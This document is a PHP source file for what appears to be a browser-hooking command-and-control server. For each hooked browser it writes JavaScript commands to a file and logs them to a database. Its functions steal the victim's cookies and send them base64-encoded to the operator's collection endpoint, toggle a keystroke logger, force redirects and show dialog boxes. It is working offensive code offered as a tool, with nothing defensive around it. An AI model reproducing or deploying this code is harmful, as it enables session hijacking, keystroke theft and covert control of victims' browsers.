<?php
    require_once('database.php');
    connectToDatabase();
?>

<?php
    function addCommandExecutionEvent($browserId, $command) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, event_type, event) VALUES (NOW(3), ?, 'command execution', ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("ss", $browserId, $command)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    function stealUserCookies($browserId) { 
   
        if(isset($browserId) && !empty($browserId)) {
            $file = '../' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=command result&event=" + btoa(document.cookie);';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Steal user cookies");
            return 0;
        }      

        return 1;
    }

    function displayDialogBox($browserId, $message) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("display of the dialog box successfully");alert("' . $message . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Display dialog box(\"" . $message . "\")");
            return 0;
        }  

        return 1;
    }

    function redirect($browserId, $url) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../' . $browserId . '_commands.js';
            
            $command = 'new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("redirect successfully");window.location.replace("' . $url . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Redirect user(\"" . $url . "\")");
            return 0;
        }  

        return 1;
    }

    function keylogger($browserId, $state) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../' . $browserId . '_commands.js';
            if($state === "enable") {
                $command = 'new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=keylogger (enabled)&event=" + btoa("keylogger enabled successfully");document.onkeypress = getOnKeyPress;document.onkeydown = getOnKeyDown;';
            }
            else {
                $command = 'new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=keylogger (disabled)&event=" + btoa("keylogger disabled successfully");document.onkeypress = "";document.onkeydown = "";';              
            }

            file_put_contents($file, $command);

            return 0;
        }  

        return 1;
    }

    function getKeyloggerState($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("SELECT browser_id, keylogger_func FROM keylogger_browsers WHERE browser_id = ?"))) {
                return;
            }

            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }
            
            if(!$stmt->execute()) {
                return;
            }

            $outBrowserId = NULL;
            $outKeyloggerState = NULL;
            $keyloggerState = array();

            $stmt->store_result();
            $stmt->bind_result($outBrowserId, $outKeyloggerState);
            if($stmt->num_rows === 1) { 
                while ($stmt->fetch()) {
                    $keyloggerState[] = array('browserId'=>$outBrowserId, 'state'=>$outKeyloggerState);
                }

                $stmt->free_result();
                $stmt->close(); 

                return $keyloggerState;  
            }
        }  
    }

    function stopCommand($browserId) {   
        if(isset($browserId) && !empty($browserId)) {
            $file = './commands/' . $browserId . '_commands.js';
            $command = '';

            file_put_contents($file, $command);
        }    
    }
?>